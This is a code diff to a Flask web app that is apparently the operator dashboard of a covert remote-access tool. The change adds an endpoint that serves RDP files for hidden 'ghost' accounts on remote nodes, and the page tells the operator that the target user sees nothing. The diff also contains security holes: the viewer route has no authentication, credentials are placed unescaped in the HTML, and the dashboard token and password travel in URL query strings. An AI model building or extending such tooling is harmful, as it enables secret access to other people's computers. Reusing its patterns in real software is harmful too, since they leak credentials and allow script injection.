@@ -324,21 +324,11 @@ def handle_ghost_cleanup_result(data):
 # This page gives the operator instructions + a direct RDP file download
 # that connects through the tunnel.
 
-@app.route('/ghost_viewer')
-def ghost_viewer():
-    token = request.args.get('token', '') or request.headers.get('X-Dashboard-Token','')
-    # Light auth — pass the dashboard password as a query param
-    # (the iframe src is generated server-side with the token embedded)
-    cid  = request.args.get('cid', '')
-    user = request.args.get('user', '')
-    pwd  = request.args.get('pass', '')
-    port = request.args.get('port', '13389')
-
-    # Build an .rdp file for download + an auto-connect attempt via mstsc URI
-    rdp_content = (
+def _build_rdp_content(user, pwd, port):
+    """Build the .rdp file content string."""
+    return (
         f"full address:s:127.0.0.1:{port}\r\n"
         f"username:s:{user}\r\n"
-        f"password 51:b:{pwd}\r\n"
         f"screen mode id:i:2\r\n"
         f"use multimon:i:0\r\n"
         f"session bpp:i:32\r\n"
@@ -370,78 +360,172 @@ def ghost_viewer():
         f"promptcredentialonce:i:0\r\n"
         f"drivestoredirect:s:\r\n"
     )
-    import base64 as _b64
-    rdp_b64 = _b64.b64encode(rdp_content.encode()).decode()
+
+@app.route('/download_rdp')
+def download_rdp():
+    """Serve the .rdp file as a proper HTTP download — works from iframes too."""
+    token = request.args.get('token', '') or request.headers.get('X-Dashboard-Token', '')
+    if token != DASHBOARD_PASS:
+        return 'Unauthorized', 403
+    user = request.args.get('user', 'ghost')
+    pwd  = request.args.get('pass', '')
+    port = request.args.get('port', '13389')
+    content = _build_rdp_content(user, pwd, port)
+    from flask import Response
+    return Response(
+        content,
+        mimetype='application/x-rdp',
+        headers={
+            'Content-Disposition': f'attachment; filename="ghost_{user}.rdp"',
+            'Cache-Control': 'no-store',
+        }
+    )
+
+@app.route('/ghost_viewer')
+def ghost_viewer():
+    cid   = request.args.get('cid', '')
+    user  = request.args.get('user', '')
+    pwd   = request.args.get('pass', '')
+    port  = request.args.get('port', '13389')
+    token = request.args.get('token', '')
+
+    # Build the download URL — real HTTP endpoint, no data: URI nonsense
+    download_url = (
+        f"/download_rdp"
+        f"?token={token}"
+        f"&user={user}"
+        f"&pass={pwd}"
+        f"&port={port}"
+    )
 
     html = f"""<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Ghost Desktop — {user}</title>
+<title>Ghost Desktop \u2014 {user}</title>
 <style>
 *{{margin:0;padding:0;box-sizing:border-box;}}
-body{{background:#07080d;color:#e2e8f0;font-family:'Geist Mono',monospace;
-      display:flex;flex-direction:column;height:100vh;overflow:hidden;}}
-.hdr{{flex-shrink:0;height:40px;background:#0d0f1a;border-bottom:1px solid rgba(255,255,255,0.06);
+html,body{{height:100%;}}
+body{{background:#07080d;color:#e2e8f0;
+      font-family:'Geist Mono',ui-monospace,monospace;
+      display:flex;flex-direction:column;overflow:hidden;}}
+.hdr{{flex-shrink:0;height:40px;background:#0d0f1a;
+      border-bottom:1px solid rgba(255,255,255,0.06);
       display:flex;align-items:center;padding:0 16px;gap:12px;}}
 .hdr-title{{font-size:12px;color:rgba(255,255,255,0.6);letter-spacing:0.08em;}}
-.hdr-badge{{font-size:9px;padding:2px 8px;border-radius:100px;
-            background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.3);
-            color:#4ade80;letter-spacing:0.08em;}}
-.body{{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
-       gap:20px;padding:32px;}}
+.badge{{font-size:9px;padding:2px 8px;border-radius:100px;
+        background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.3);
+        color:#4ade80;letter-spacing:0.08em;}}
+.body{{flex:1;overflow-y:auto;display:flex;flex-direction:column;
+       align-items:center;justify-content:center;gap:20px;padding:32px;}}
 .card{{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
-       border-radius:10px;padding:24px 28px;max-width:520px;width:100%;}}
-.card-title{{font-size:11px;color:rgba(255,255,255,0.4);letter-spacing:0.1em;
-             text-transform:uppercase;margin-bottom:16px;}}
-.cred{{background:rgba(0,0,0,0.4);border:1px solid rgba(59,130,246,0.25);
-       border-radius:7px;padding:12px 16px;font-size:12px;color:#93c5fd;line-height:2.2;}}
-.cred .lbl{{color:rgba(255,255,255,0.3);font-size:9px;letter-spacing:0.1em;text-transform:uppercase;}}
+       border-radius:10px;padding:24px 28px;max-width:540px;width:100%;}}
+.card-title{{font-size:10px;color:rgba(255,255,255,0.35);letter-spacing:0.12em;
+             text-transform:uppercase;margin-bottom:14px;font-weight:600;}}
+.cred{{background:rgba(0,0,0,0.45);border:1px solid rgba(59,130,246,0.22);
+       border-radius:7px;padding:14px 18px;font-size:12px;color:#93c5fd;line-height:2.4;}}
+.lbl{{color:rgba(255,255,255,0.28);font-size:9px;letter-spacing:0.1em;
+      text-transform:uppercase;display:block;}}
+.val{{font-size:13px;color:#e2e8f0;letter-spacing:0.04em;}}
+.copy-row{{display:flex;align-items:center;gap:6px;margin-top:2px;}}
+.copy-btn{{font-size:9px;padding:2px 7px;border:1px solid rgba(255,255,255,0.1);
+           border-radius:4px;background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.45);
+           cursor:pointer;font-family:inherit;transition:all 0.1s;}}
+.copy-btn:hover{{background:rgba(255,255,255,0.1);color:#fff;}}
+.btns{{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px;}}
 .btn{{display:inline-flex;align-items:center;gap:7px;
-      padding:10px 20px;border-radius:7px;cursor:pointer;font-family:inherit;font-size:11px;
-      letter-spacing:0.06em;border:1px solid;transition:all 0.15s;text-decoration:none;}}
-.btn-green{{color:#4ade80;border-color:rgba(34,197,94,0.3);background:rgba(34,197,94,0.1);}}
-.btn-green:hover{{background:rgba(34,197,94,0.2);}}
-.btn-blue{{color:#60a5fa;border-color:rgba(59,130,246,0.3);background:rgba(59,130,246,0.1);}}
-.btn-blue:hover{{background:rgba(59,130,246,0.2);}}
-.btns{{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px;}}
-.note{{font-size:10px;color:rgba(255,255,255,0.25);line-height:1.8;margin-top:12px;}}
+      padding:10px 20px;border-radius:7px;cursor:pointer;
+      font-family:inherit;font-size:11px;font-weight:600;
+      letter-spacing:0.06em;border:1px solid;transition:all 0.15s;
+      text-decoration:none;}}
+.btn-green{{color:#4ade80;border-color:rgba(34,197,94,0.35);background:rgba(34,197,94,0.1);}}
+.btn-green:hover{{background:rgba(34,197,94,0.22);transform:translateY(-1px);}}
+.note{{font-size:10px;color:rgba(255,255,255,0.22);line-height:1.9;margin-top:14px;}}
+.note b{{color:rgba(255,255,255,0.55);}}
+.steps{{counter-reset:step;}}
+.step{{display:flex;align-items:flex-start;gap:10px;padding:8px 0;
+        border-bottom:1px solid rgba(255,255,255,0.04);}}
+.step:last-child{{border:none;}}
+.step-n{{width:20px;height:20px;border-radius:50%;flex-shrink:0;
+          background:rgba(59,130,246,0.15);border:1px solid rgba(59,130,246,0.3);
+          color:#60a5fa;font-size:10px;display:flex;align-items:center;justify-content:center;}}
+.step-t{{font-size:11px;color:rgba(255,255,255,0.5);line-height:1.7;padding-top:1px;}}
 </style>
 </head>
 <body>
 <div class="hdr">
-  <div class="hdr-title">👻 GHOST DESKTOP SESSION</div>
-  <div class="hdr-badge">LIVE</div>
-  <div style="margin-left:auto;font-size:10px;color:rgba(255,255,255,0.3);">Node: {cid[:12]}…</div>
+  <div class="hdr-title">&#x1F47B; GHOST DESKTOP SESSION</div>
+  <div class="badge">LIVE</div>
+  <div style="margin-left:auto;font-size:10px;color:rgba(255,255,255,0.25);">
+    node {cid[:16]}&hellip;
+  </div>
 </div>
 <div class="body">
   <div class="card">
     <div class="card-title">Ghost Account Credentials</div>
     <div class="cred">
-      <div><span class="lbl">Username</span><br>{user}</div>
-      <div style="margin-top:8px;"><span class="lbl">Password</span><br>{pwd}</div>
-      <div style="margin-top:8px;"><span class="lbl">RDP Port (tunnel)</span><br>127.0.0.1:{port}</div>
+      <div>
+        <span class="lbl">Username</span>
+        <div class="copy-row">
+          <span class="val" id="v-user">{user}</span>
+          <button class="copy-btn" onclick="copy('v-user',this)">copy</button>
+        </div>
+      </div>
+      <div style="margin-top:10px;">
+        <span class="lbl">Password</span>
+        <div class="copy-row">
+          <span class="val" id="v-pass">{pwd}</span>
+          <button class="copy-btn" onclick="copy('v-pass',this)">copy</button>
+        </div>
+      </div>
+      <div style="margin-top:10px;">
+        <span class="lbl">RDP Address (tunnel)</span>
+        <span class="val">127.0.0.1:{port}</span>
+      </div>
     </div>
     <div class="btns">
-      <a class="btn btn-green" href="data:application/octet-stream;base64,{rdp_b64}" download="ghost_{user}.rdp">
-        ⬇ Download .RDP File
-      </a>
-      <a class="btn btn-blue" href="rdp://127.0.0.1:{port}" target="_blank">
-        🖥 Open mstsc (local)
+      <a class="btn btn-green" href="{download_url}">
+        &#x2B07; Download .RDP File
       </a>
     </div>
-    <div class="note">
-      ① Click <b style="color:rgba(255,255,255,0.6);">Download .RDP File</b> → open it → Windows Remote Desktop connects automatically.<br>
-      ② Or click <b style="color:rgba(255,255,255,0.6);">Open mstsc</b> if you have the SSH tunnel forwarded to localhost:{port}.
+    <div class="note steps">
+      <div class="step">
+        <div class="step-n">1</div>
+        <div class="step-t">Click <b>Download .RDP File</b> &mdash; save it anywhere on your machine.</div>
+      </div>
+      <div class="step">
+        <div class="step-n">2</div>
+        <div class="step-t">Double-click the downloaded <b>.rdp</b> file &mdash; Windows Remote Desktop opens and connects automatically to the ghost session.</div>
+      </div>
+      <div class="step">
+        <div class="step-n">3</div>
+        <div class="step-t">If prompted for credentials, enter the username &amp; password shown above. The target user sees nothing &mdash; their session is unaffected.</div>
+      </div>
     </div>
   </div>
 </div>
+<script>
+function copy(id, btn) {{
+  const t = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(t).then(() => {{
+    btn.textContent = 'copied!';
+    btn.style.color = '#4ade80';
+    setTimeout(() => {{ btn.textContent = 'copy'; btn.style.color = ''; }}, 1500);
+  }}).catch(() => {{
+    const ta = document.createElement('textarea');
+    ta.value = t; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.textContent = 'copied!';
+    setTimeout(() => {{ btn.textContent = 'copy'; }}, 1500);
+  }});
+}}
+</script>
 </body>
 </html>"""
     return html
 
 # ── Helpers ───────────────────────────────────────────────────
-
 def sanitized_clients():
     return [{k: v for k, v in c.items() if k != 'sid'} for c in clients.values()]
 
